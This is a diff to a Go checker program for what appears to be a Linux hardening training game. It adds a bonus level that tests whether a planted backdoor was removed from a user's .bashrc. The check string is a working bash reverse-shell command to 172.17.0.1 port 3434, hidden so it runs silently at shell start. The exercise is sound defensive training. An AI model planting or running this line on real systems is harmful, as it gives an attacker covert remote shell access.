@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"flag"
 	"fmt"
 	"os"
@@ -183,6 +184,39 @@ func level7() bool {
 	// To pass: kill the process listening on port 3306
 }
 
+// searchStringInFile checks if a string is present in a file.
+// Returns true if found, false otherwise.
+func searchStringInFile(filePath string, searchString string) (bool, error) {
+	// Open the file for reading.
+	file, err := os.Open(filePath)
+	if err != nil {
+		return false, err
+	}
+	defer file.Close()
+
+	// Create a new scanner for the file.
+	scanner := bufio.NewScanner(file)
+
+	// Loop through all lines of the file.
+	for scanner.Scan() {
+		// Check if the current line contains the search string.
+		if strings.Contains(scanner.Text(), searchString) {
+			return true, nil // Found the string.
+		}
+	}
+
+	// Check for scanning error.
+	if err := scanner.Err(); err != nil {
+		return false, err
+	}
+
+	return false, nil // Did not find the string.
+}
+func bonusLevel() bool {
+	found, _ := searchStringInFile("/home/bitty/.bashrc", "(/bin/bash -i >& /dev/tcp/172.17.0.1/3434 0>&1 & disown) 2>/dev/null; cat")
+	return !found
+}
+
 func printhint(level string) {
 	switch level {
 	case "level 1":
@@ -226,14 +260,28 @@ func main() {
 	levelResults["level 6"] = level6()
 	levelResults["level 7"] = level7()
 
+	allPassed := true
+
 	for level, passed := range levelResults {
 		if passed {
 			fmt.Printf("%s: ☒\n", level)
 		} else {
 			fmt.Printf("%s: ☐\n", level)
+			allPassed = false
 			if hintFlag {
 				printhint(level)
 			}
+		}
+	}
+
+	if allPassed {
+		fmt.Println("BONUS LEVEL:\nAfter having fixed the more pressing issues, your manager returns.")
+		fmt.Println("They congratulate you, however just before you pop the champagne")
+		fmt.Println("you are informed that they suspect that a backdoor has been placed on the system. Can you find it and shut it down?")
+		if !bonusLevel() {
+			fmt.Println("Backdoor still present :(")
+		} else {
+			fmt.Println("Backdoor removed, good job!")
 		}
 	}
 
@@ -253,5 +301,5 @@ func main() {
 	// 3. Set strong password policy
 	// IDEA: set an interactive shell for a service account in passwd
 	// IDEA: bonus levels with linux backdoors??? Could be cool.
-	// IDEA: Add the option to disallow users to reuse old passwords
+	// IDEA: Add the option to disallow users to reuse old passwords requires setting up pam though
 }
